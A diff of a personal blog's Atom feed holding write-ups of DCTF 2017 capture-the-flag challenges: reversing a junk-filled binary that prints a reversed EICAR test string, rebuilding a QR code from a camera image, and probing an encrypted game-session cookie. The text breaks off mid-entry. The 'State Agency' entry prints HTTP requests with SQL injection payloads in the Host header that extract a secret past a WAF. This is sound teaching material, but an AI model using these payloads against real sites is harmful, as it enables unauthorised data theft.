@@ -1,12 +1,12 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom">
+<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
   <generator uri="http://jekyllrb.com" version="3.8.3">Jekyll</generator>
   
   
-  <link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" />
-  <link href="http://localhost:4000/" rel="alternate" type="text/html" />
-  <updated>2018-07-13T02:13:52+03:00</updated>
-  <id>http://localhost:4000//</id>
+  <link href="https://nitesculucian.github.io/feed.xml" rel="self" type="application/atom+xml" />
+  <link href="https://nitesculucian.github.io/" rel="alternate" type="text/html" hreflang="en" />
+  <updated>2018-07-15T11:57:09-03:00</updated>
+  <id>https://nitesculucian.github.io//</id>
 
   
     <title type="html">Lucian Nitescu</title>
@@ -17,7 +17,968 @@
   
 
   
+    <author>
+        <name>Lucian Nitescu</name>
+      
+      
+    </author>
+  
 
+  
+  
+    <entry>
+      
+      <title type="html">[DCTF 2017] Working Junks Writeup</title>
+      
+      
+      <link href="https://nitesculucian.github.io/2018/07/15/dctf-2017-working-junks-writeup/" rel="alternate" type="text/html" title="[DCTF 2017] Working Junks Writeup" />
+      
+      <published>2018-07-15T11:49:00-03:00</published>
+      <updated>2018-07-15T11:49:00-03:00</updated>
+      <id>https://nitesculucian.github.io/2018/07/15/dctf-2017-working-junks-writeup</id>
+      <content type="html" xml:base="https://nitesculucian.github.io/2018/07/15/dctf-2017-working-junks-writeup/">&lt;h3 id=&quot;description&quot;&gt;Description:&lt;/h3&gt;
+&lt;p&gt;https://snag.gy/1hqQnF.jpg&lt;/p&gt;
+
+&lt;h3 id=&quot;author&quot;&gt;Author:&lt;/h3&gt;
+&lt;p&gt;Lucian Nitescu&lt;/p&gt;
+
+&lt;h3 id=&quot;stats&quot;&gt;Stats:&lt;/h3&gt;
+&lt;p&gt;162 points / 55 solvers&lt;/p&gt;
+
+&lt;h3 id=&quot;solution&quot;&gt;Solution:&lt;/h3&gt;
+
+&lt;p&gt;First of all the above given description is a reference to the junk (the ship/boat) and the red line below is a reference to the “in reverse”.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CCSIR/dctf-2017/master/quals/revexp/Working_Junks/img/1.png&quot; alt=&quot;alt text&quot; title=&quot;The description&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The challenge start with:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mehuser:~$ file e
+e: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=20712db5ad286fbbcfe0005d23d8cbcc3965cffa, not stripped
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;After we run this 64-bit ELF we got three things (hints):&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mehuser:~$ chmod +x ./e
+mehuser:~$ ./e
+?em wonk uoy oD !!!olleH
+!sdnatsrednu eno on taht yrots gib a evah I dnA !RACIE si eman yM
+!edoc ym si siht dnA
+*H+H$!ELIF-TSET-SURIVITNA-DRADNATS-RACIE$}7)CC7)^P(45XZP4[PA@P!O5XX5O!P%@AP[4PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*~jn
+
+~cb|6o
+f
+
+f
+jo`aff
+m}mlqoqo%|
+u
+
+ 
+u
+    
+
+u
+ 
+
+  uy|sr
+7Z N?J/.?4[?57Z[G?1FX,,FXK*&amp;amp;,.=B&amp;lt;;.!+.=+B.!;&amp;amp;9&amp;amp;=:&amp;lt;B;*&amp;lt;;B)&amp;amp;#*NK'D'E
+X5O!P
+3.000000, 4.000000, 5.000000 
+
+
+&amp;lt;snip of more junks&amp;gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;ol&gt;
+  &lt;li&gt;We have junk, intended junk.&lt;/li&gt;
+  &lt;li&gt;We have strings in reverse.&lt;/li&gt;
+  &lt;li&gt;We have an eicar code missing characters because of “&quot; (you can check with strings also)&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Reverse everything in python with this script:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# 1.py
+f = open(&quot;e&quot;, &quot;r&quot;)
+buf = f.read()
+f.close()
+buf = buf.encode(&quot;hex&quot;)
+buf = buf[::-1]
+f = open(&quot;sol&quot;, &quot;w&quot;)
+f.write(buf.decode(&quot;hex&quot;))
+f.close()
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;And then use binwalk to extract something from the junk!&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mehuser:~$ python ./rev.py 
+mehuser:~$ binwalk sol
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+11576         0x2D38          PNG image, 862 x 171, 8-bit/color RGB, non-interlaced
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So we got to extract a PNG file that was stored in a string (reversed hex dump of the PNG file) in the first place.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CCSIR/dctf-2017/master/quals/revexp/Working_Junks/img/4.png&quot; alt=&quot;alt text&quot; title=&quot;The flag&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The flag is: DCTF{63a47eb3bcfade799a44e0560e891c25029e442e538276fb403975d18f93d88e}&lt;/p&gt;</content>
+
+      
+      
+      
+      
+      
+
+      
+        <author>
+            <name>Lucian Nitescu</name>
+          
+          
+        </author>
+      
+
+      
+        <category term="dctf" />
+      
+        <category term="ctf" />
+      
+        <category term="writeups" />
+      
+
+      
+
+      
+        <summary type="html">Description: https://snag.gy/1hqQnF.jpg</summary>
+      
+
+      
+      
+    </entry>
+  
+  
+  
+    <entry>
+      
+      <title type="html">[DCTF 2017] Security CCTV Writeup</title>
+      
+      
+      <link href="https://nitesculucian.github.io/2018/07/15/dctf-2017-security-cctv-writeup/" rel="alternate" type="text/html" title="[DCTF 2017] Security CCTV Writeup" />
+      
+      <published>2018-07-15T11:44:00-03:00</published>
+      <updated>2018-07-15T11:44:00-03:00</updated>
+      <id>https://nitesculucian.github.io/2018/07/15/dctf-2017-security-cctv-writeup</id>
+      <content type="html" xml:base="https://nitesculucian.github.io/2018/07/15/dctf-2017-security-cctv-writeup/">&lt;h3 id=&quot;description&quot;&gt;Description:&lt;/h3&gt;
+&lt;p&gt;We really need that token. Can you take it? https://security-cctv.dctf-f1nals-2017.def.camp/.&lt;/p&gt;
+
+&lt;h3 id=&quot;author&quot;&gt;Author:&lt;/h3&gt;
+&lt;p&gt;Lucian Nitescu&lt;/p&gt;
+
+&lt;h3 id=&quot;stats&quot;&gt;Stats:&lt;/h3&gt;
+&lt;p&gt;374 point / 7 solvers&lt;/p&gt;
+
+&lt;h3 id=&quot;solution&quot;&gt;Solution:&lt;/h3&gt;
+
+&lt;p&gt;The challenge started with this page:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CCSIR/dctf-2017/master/finals/misc/security-cctv/img/1.png&quot; alt=&quot;alt text&quot; title=&quot;1&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;There you can observe the QR code an his reflection on the laptop:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CCSIR/dctf-2017/master/finals/misc/security-cctv/img/2.png&quot; alt=&quot;alt text&quot; title=&quot;2&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And also you can observe the time and date (Date: 2017-11-13 09:42:10.725649) which will be changed at every minute with the photo itself. On the server side there is a cron job of a python script which will generate a random QR code which will be inserted in the “frame” image.&lt;/p&gt;
+
+&lt;p&gt;Using the following python script we can extract the QR code from the image and retrive the token.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import pyqrcode
+import string
+import random
+import png 
+import ImageOps
+import ImageDraw
+import numpy
+from PIL import Image, ImageEnhance
+import urllib
+import qrtools
+from qrtools import QR
+
+
+def transformblit(src_tri, dst_tri, src_img, dst_img):
+    ((x11,x12), (x21,x22), (x31,x32)) = src_tri
+    ((y11,y12), (y21,y22), (y31,y32)) = dst_tri
+
+    M = numpy.array([
+                     [y11, y12, 1, 0, 0, 0],
+                     [y21, y22, 1, 0, 0, 0],
+                     [y31, y32, 1, 0, 0, 0],
+                     [0, 0, 0, y11, y12, 1],
+                     [0, 0, 0, y21, y22, 1],
+                     [0, 0, 0, y31, y32, 1]
+                ])
+
+    y = numpy.array([x11, x21, x31, x12, x22, x32])
+
+    A = numpy.linalg.solve(M, y)
+
+    src_copy = src_img.copy()
+    srcdraw = ImageDraw.Draw(src_copy)
+    srcdraw.polygon(src_tri)
+    transformed = src_img.transform(dst_img.size, Image.AFFINE, A)
+
+    mask = Image.new('1', dst_img.size)
+    maskdraw = ImageDraw.Draw(mask)
+    maskdraw.polygon(dst_tri, fill=0)
+
+    dstdraw = ImageDraw.Draw(dst_img)
+    dstdraw.polygon(dst_tri, fill=(0,0,0,0))
+    dst_img.paste(transformed, mask=mask)
+
+def randomg(size=6, chars=string.ascii_uppercase + string.digits):
+    return ''.join(random.choice(chars) for x in range(size))
+# hell gose lose here
+# http://13.81.248.25/qr/img/streamframe.png
+urllib.urlretrieve(&quot;http://13.81.248.25/qr/img/streamframe.png&quot;, &quot;streamframe.png&quot; )
+qr = Image.open(&quot;streamframe.png&quot;).convert(&quot;RGBA&quot;)
+blank = Image.new(&quot;RGBA&quot;, (4608, 2529), (0,0,0,0))
+
+#Start: Part 1 of the QR code
+part1 = qr.crop((2089, 1558, 2358, 1723))
+contrast = ImageEnhance.Contrast(part1)
+part1 = contrast.enhance(1.6)
+
+part1 = part1.rotate(22, resample=Image.BICUBIC, expand=True)
+width, height = part1.size
+m = -0.62
+xshift = abs(m) * width
+new_width = width + int(round(xshift))
+part1 = part1.transform((new_width, height), Image.AFFINE,
+        (1, m, -xshift if m &amp;gt; 0 else 0, 0, 1.43, 0), Image.BILINEAR)
+
+part1 = part1.resize((285, 285), Image.ANTIALIAS)
+part1 = part1.resize((800, 800), Image.ANTIALIAS)
+
+
+# junk trimming
+tri1 = [(10,10), (20,20), (10,20)]
+tri2 = [(10,10), (212,100), (208,800)]
+transformblit(tri1, tri2, blank, part1)
+tri2 = [(150,500), (211,280), (600,800)]
+transformblit(tri1, tri2, blank, part1)
+tri2 = [(300,420), (470,420), (600,800)]
+transformblit(tri1, tri2, blank, part1)
+tri2 = [(470,420), (470,100), (900,600)]
+transformblit(tri1, tri2, blank, part1)
+tri2 = [(100,140), (470,140), (800,10)]
+transformblit(tri1, tri2, blank, part1)
+tri2 = [(344,218), (365,0), (800,670)]
+transformblit(tri1, tri2, blank, part1)
+# final trim
+part1 = part1.crop((213, 141, 469, 419))
+
+contrast = ImageEnhance.Contrast(part1)
+part1 = contrast.enhance(1.5)
+
+#Start: Part 2 of the QR code
+part2 = qr.crop((2031, 1584, 2287, 1742))
+contrast = ImageEnhance.Contrast(part2)
+part2 = contrast.enhance(2.7)
+
+part2 = ImageOps.mirror(part2)
+
+
+part2 = part2.rotate(0+20-4, resample=Image.BICUBIC, expand=True)
+
+width, height = part2.size
+m = -0.49
+xshift = abs(m) * width
+new_width = width + int(round(xshift))
+part2 = part2.transform((new_width, height), Image.AFFINE,
+        (1.1, m, -xshift if m &amp;gt; 0 else 0, 0, 1.605, 0), Image.BILINEAR)
+part2 = part2.resize((800, 700), Image.ANTIALIAS)
+contrast = ImageEnhance.Contrast(part2)
+part2 = contrast.enhance(1.2)
+
+part2 = part2.crop((245, 80, 393, 301))
+tri1 = [(10,10), (20,20), (10,20)]
+tri2 = [(0,0), (0,220), (100,220)]
+transformblit(tri1, tri2, blank, part2)
+part2 = part2.resize((240, 278), Image.ANTIALIAS)
+
+
+blank2 = Image.new(&quot;RGBA&quot;, (278, 278), (0,0,0,0))
+
+contrast = ImageEnhance.Contrast(part2)
+part2 = contrast.enhance(1.6)
+
+blank2.paste(part2, (12, 4), part2)
+blank2.paste(part1, (0, 0), part1)
+blank2.save(&quot;./sol.png&quot;, &quot;PNG&quot;)
+part1.save(&quot;./part1.png&quot;, &quot;PNG&quot;)
+part2.save(&quot;./part2.png&quot;, &quot;PNG&quot;)
+
+
+myCode = QR(filename=u&quot;./sol.png&quot;)
+if myCode.decode():
+  print myCode.data_to_string()
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Example of “phone” QR code retrieval:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;part1 = qr.crop((2089, 1558, 2358, 1723))
+contrast = ImageEnhance.Contrast(part1)
+part1 = contrast.enhance(1.6)
+
+part1 = part1.rotate(22, resample=Image.BICUBIC, expand=True)
+width, height = part1.size
+m = -0.62
+xshift = abs(m) * width
+new_width = width + int(round(xshift))
+part1 = part1.transform((new_width, height), Image.AFFINE,
+        (1, m, -xshift if m &amp;gt; 0 else 0, 0, 1.43, 0), Image.BILINEAR)
+
+part1 = part1.resize((285, 285), Image.ANTIALIAS)
+part1 = part1.resize((800, 800), Image.ANTIALIAS)
+
+
+# junk trimming
+tri1 = [(10,10), (20,20), (10,20)]
+tri2 = [(10,10), (212,100), (208,800)]
+transformblit(tri1, tri2, blank, part1)
+tri2 = [(150,500), (211,280), (600,800)]
+transformblit(tri1, tri2, blank, part1)
+tri2 = [(300,420), (470,420), (600,800)]
+transformblit(tri1, tri2, blank, part1)
+tri2 = [(470,420), (470,100), (900,600)]
+transformblit(tri1, tri2, blank, part1)
+tri2 = [(100,140), (470,140), (800,10)]
+transformblit(tri1, tri2, blank, part1)
+tri2 = [(344,218), (365,0), (800,670)]
+transformblit(tri1, tri2, blank, part1)
+# final trim
+part1 = part1.crop((213, 141, 469, 419))
+
+contrast = ImageEnhance.Contrast(part1)
+part1 = contrast.enhance(1.5)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Result:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CCSIR/dctf-2017/master/finals/misc/security-cctv/img/3.png&quot; alt=&quot;alt text&quot; title=&quot;3&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Example of “laptop” QR code retrieval:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;part2 = qr.crop((2031, 1584, 2287, 1742))
+contrast = ImageEnhance.Contrast(part2)
+part2 = contrast.enhance(2.7)
+
+part2 = ImageOps.mirror(part2)
+
+
+part2 = part2.rotate(0+20-4, resample=Image.BICUBIC, expand=True)
+
+width, height = part2.size
+m = -0.49
+xshift = abs(m) * width
+new_width = width + int(round(xshift))
+part2 = part2.transform((new_width, height), Image.AFFINE,
+        (1.1, m, -xshift if m &amp;gt; 0 else 0, 0, 1.605, 0), Image.BILINEAR)
+part2 = part2.resize((800, 700), Image.ANTIALIAS)
+contrast = ImageEnhance.Contrast(part2)
+part2 = contrast.enhance(1.2)
+
+part2 = part2.crop((245, 80, 393, 301))
+tri1 = [(10,10), (20,20), (10,20)]
+tri2 = [(0,0), (0,220), (100,220)]
+transformblit(tri1, tri2, blank, part2)
+part2 = part2.resize((240, 278), Image.ANTIALIAS)
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Result:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CCSIR/dctf-2017/master/finals/misc/security-cctv/img/4.png&quot; alt=&quot;alt text&quot; title=&quot;4&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Final QR:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CCSIR/dctf-2017/master/finals/misc/security-cctv/img/5.png&quot; alt=&quot;alt text&quot; title=&quot;5&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Execution of the python script:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;lucian@nitescu:~/security-cctv$ python sol.py 
+BMQQGBMIBKCIAIJLBOKNIKAACQPPKAJGNCKNBNBHOIJQQPHAHCLPJQHIBJIIQCNKIJJBBNKLJGAQJLHKHIALMBMCN
+lucian@nitescu:~/security-cctv$ 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;After entering the token in less than a minute we get the flag.&lt;/p&gt;
+
+&lt;p&gt;DCTF{44c5e6a2ef50636b1d5ad1023bb2c63a5ed62d40549d9edb537c54b4cb72b37e}&lt;/p&gt;</content>
+
+      
+      
+      
+      
+      
+
+      
+        <author>
+            <name>Lucian Nitescu</name>
+          
+          
+        </author>
+      
+
+      
+        <category term="dctf" />
+      
+        <category term="ctf" />
+      
+        <category term="writeups" />
+      
+
+      
+
+      
+        <summary type="html">Description: We really need that token. Can you take it? https://security-cctv.dctf-f1nals-2017.def.camp/.</summary>
+      
+
+      
+      
+    </entry>
+  
+  
+  
+    <entry>
+      
+      <title type="html">[DCTF 2017] State Agency Writeup</title>
+      
+      
+      <link href="https://nitesculucian.github.io/2018/07/15/dctf-2017-state-agency-writeup/" rel="alternate" type="text/html" title="[DCTF 2017] State Agency Writeup" />
+      
+      <published>2018-07-15T11:37:00-03:00</published>
+      <updated>2018-07-15T11:37:00-03:00</updated>
+      <id>https://nitesculucian.github.io/2018/07/15/dctf-2017-state-agency-writeup</id>
+      <content type="html" xml:base="https://nitesculucian.github.io/2018/07/15/dctf-2017-state-agency-writeup/">&lt;h3 id=&quot;description&quot;&gt;Description:&lt;/h3&gt;
+&lt;p&gt;This state agency has some secrets. Exfiltrate those.
+http://state-agency.tux.ro/&lt;/p&gt;
+
+&lt;h3 id=&quot;author&quot;&gt;Author:&lt;/h3&gt;
+&lt;p&gt;Lucian Nitescu&lt;/p&gt;
+
+&lt;h3 id=&quot;stats&quot;&gt;Stats:&lt;/h3&gt;
+&lt;p&gt;382 point / 5 solvers&lt;/p&gt;
+
+&lt;h3 id=&quot;solution&quot;&gt;Solution:&lt;/h3&gt;
+
+&lt;p&gt;The challenge started with this simple website:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CCSIR/dctf-2017/master/finals/web/state-agency/img/1.png&quot; alt=&quot;alt text&quot; title=&quot;1&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Example of an “article”:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CCSIR/dctf-2017/master/finals/web/state-agency/img/2.png&quot; alt=&quot;alt text&quot; title=&quot;2&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;By removing the parameters (example: “?Keyium=5889&amp;amp;Name=20+hacker+cats!&amp;amp;Owner=SA&amp;amp;Permission=cHVibGljcHVibGljcHVibGljcHV
+ibGljcHVibGljcHVibGlj”) we get the same response as before. The only input is the subdomain name. By setting it to 5888 we get:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CCSIR/dctf-2017/master/finals/web/state-agency/img/3.png&quot; alt=&quot;alt text&quot; title=&quot;3&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The answer is a hint to an SQL injection challenge and also when we arrive on 5885 we get:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CCSIR/dctf-2017/master/finals/web/state-agency/img/4.png&quot; alt=&quot;alt text&quot; title=&quot;4&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;If we will perform an basic SQL injection in the subdomain name we will get:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET / HTTP/1.1
+Host: 5885 ') or 1 ;-- .state-agency.tux.ro
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:56.0) Gecko/20100101 Firefox/56.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Upgrade-Insecure-Requests: 1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CCSIR/dctf-2017/master/finals/web/state-agency/img/5.png&quot; alt=&quot;alt text&quot; title=&quot;5&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The only way to bypass the “WAF” is to avoid certain requests. Also if you obtain in your response “DCTF”, “{“ or “}” your request will be blocked and you will receive “the Private data exfiltration attempt blocked” response. One way of extracting the flag is to extract characters as such:&lt;/p&gt;
+
+&lt;p&gt;HTTP Request:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET / HTTP/1.1
+Host: 5880') union select 1, 1, 1, 1, SUBSTRING(Content, 1, 1) from articles ;-- .state-agency.tux.ro
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:56.0) Gecko/20100101 Firefox/56.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Upgrade-Insecure-Requests: 1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Flag Response: D&lt;/p&gt;
+
+&lt;p&gt;HTTP Request:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET / HTTP/1.1
+Host: 5880') union select 1, 1, 1, 1, SUBSTRING(Content, 1, 1) from articles ;-- .state-agency.tux.ro
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:56.0) Gecko/20100101 Firefox/56.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Upgrade-Insecure-Requests: 1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Flag Response: DCT&lt;/p&gt;
+
+&lt;p&gt;Until you will get that the flag is: DCTF{8bd68b9d0b517ae71d32c62d7d00cbf27822d5014d1a8483684e19fbea99c44f}&lt;/p&gt;</content>
+
+      
+      
+      
+      
+      
+
+      
+        <author>
+            <name>Lucian Nitescu</name>
+          
+          
+        </author>
+      
+
+      
+        <category term="dctf" />
+      
+        <category term="ctf" />
+      
+        <category term="writeups" />
+      
+
+      
+
+      
+        <summary type="html">Description: This state agency has some secrets. Exfiltrate those. http://state-agency.tux.ro/</summary>
+      
+
+      
+      
+    </entry>
+  
+  
+  
+    <entry>
+      
+      <title type="html">[DCTF 2017] hack-tac-toe Writeup</title>
+      
+      
+      <link href="https://nitesculucian.github.io/2018/07/15/dctf-2017-hack-tac-toe-writeup/" rel="alternate" type="text/html" title="[DCTF 2017] hack-tac-toe Writeup" />
+      
+      <published>2018-07-15T11:37:00-03:00</published>
+      <updated>2018-07-15T11:37:00-03:00</updated>
+      <id>https://nitesculucian.github.io/2018/07/15/dctf-2017-hack-tac-toe-writeup</id>
+      <content type="html" xml:base="https://nitesculucian.github.io/2018/07/15/dctf-2017-hack-tac-toe-writeup/">&lt;h3 id=&quot;description&quot;&gt;Description:&lt;/h3&gt;
+&lt;p&gt;Pair up! Let’s play a game of tic tac toe :)&lt;/p&gt;
+
+&lt;p&gt;https://hacktactoe.dctf-f1nals-2017.def.camp/&lt;/p&gt;
+
+&lt;h3 id=&quot;author&quot;&gt;Author:&lt;/h3&gt;
+&lt;p&gt;Anatol, Lucian Nitescu&lt;/p&gt;
+
+&lt;h3 id=&quot;stats&quot;&gt;Stats:&lt;/h3&gt;
+&lt;p&gt;360 point / 10 solvers&lt;/p&gt;
+
+&lt;h3 id=&quot;solution&quot;&gt;Solution:&lt;/h3&gt;
+
+&lt;p&gt;The challenge started with this simple website:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CCSIR/dctf-2017/master/finals/web/hack-tac-toe/img/1.png&quot; alt=&quot;alt text&quot; title=&quot;1&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;If we change the name of Player 1 with test we get:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CCSIR/dctf-2017/master/finals/web/hack-tac-toe/img/2.png&quot; alt=&quot;alt text&quot; title=&quot;2&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Encrypted_Game_Session=ITSSn%2FICisO1i6CBSOBGkzM0kJWzU%2FS02%2B%2B92B6zVJt3N5aRvRTSxbbP9tlP4VKdcziQlroU0pa7nqPZS%2BMCyXBol8PoENSSt5rwjx7lB5gkOZfD6EDRlb%2BZ8JALvBeSdDSFy%2Bgc1dW02vzVE6U0xCF3wtepQJLM%2FJPz1wvpBcUlPIWe%2BkuIza35qoxQ4haIciyc1rNEitX8yqmfTKVfwXo%2BnNazR4rV%2FMqpn0y1RpMpNJee9A%3D%3D
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;If we change the name of Player 2 with test2 we get:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CCSIR/dctf-2017/master/finals/web/hack-tac-toe/img/3.png&quot; alt=&quot;alt text&quot; title=&quot;3&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Encrypted_Game_Session=ITSSn%2FICisO1i6CBSOBGkzM0kJWzU%2FS02%2B%2B92B6zVJt3N5aRvRTSxbbP9tlP4VKdcziQlroU0pa7nqPZS%2BMCyXBol8PoENSSt5rwjx7lB5gkOZfD6EDRlb%2BZ8JALvBeSdDSFy%2Bgc1dW02vzeG71GqEAOp6WJcbD3j6nG7SmHZKhADqeliXGw94%2Bpxu0ph2SKe32dkLNT3pbizPTPEvRenHosw9boFZLM%2FJPz1wv0B8cya4We4EuCzPyT8NcL9AfHMmuVh7IYise01A%3D%3D
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Under the Encrypted_Game_Session we observe some static stored things (because of the small variation).&lt;/p&gt;
+
+&lt;p&gt;If we request https://hacktactoe.dctf-f1nals-2017.def.camp/action.php?name=%00%00%00%00%00%00%00%00%00%00%00%00%00%00 we will get that:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Encrypted_Game_Session=ITSSn%2FICisO1i6CBSOBGkzM0kJWzU%2FS02%2B%2B92B6zVJt3N5aRvRTSxbbP9tlP4VKdcziQlroU0pa7nqPZS%2BMCyXBol8PoENSSt5rwjx7lB5gkOZfD6EDRlb%2BZ8JALvBeSdDSFy%2Bgc1dW02vzeG71GqEAOp6WJcbD3j6nG7SmHZKhADqeliXGw94%2Bpxu0ph2SKe32dkLNT3pbizPTPEvRenHosw9boFZLM%2FJPz1wv0B8cya4We4EuCzPyT8NcL9AfHMmuVh7IYise01A%3D%3D
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We now use an URL decoder:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;urldecoded(Encrypted_Game_Session):
+
+ITSSn/ICisO1i6CBSOBGkzM0kJWzU/S02++92B6zVJt3N5aRvRTSxbbP9tlP4VKdcziQlroU0pa7nqPZS+MCyXBol8PoENSSt5rwjx7lB5gkOZfD6EDRlb+Z8JALvBeSdDSFy+gc1dW02vzeG71GqEAOp6WJcbD3j6nG7SmHZKhADqeliXGw94+pxu0ph2SKe32dkLNT3pbizPTPEvRenHosw9boFZLM/JPz1wv0B8cya4We4EuCzPyT8NcL9AfHMmuVh7IYise01A==
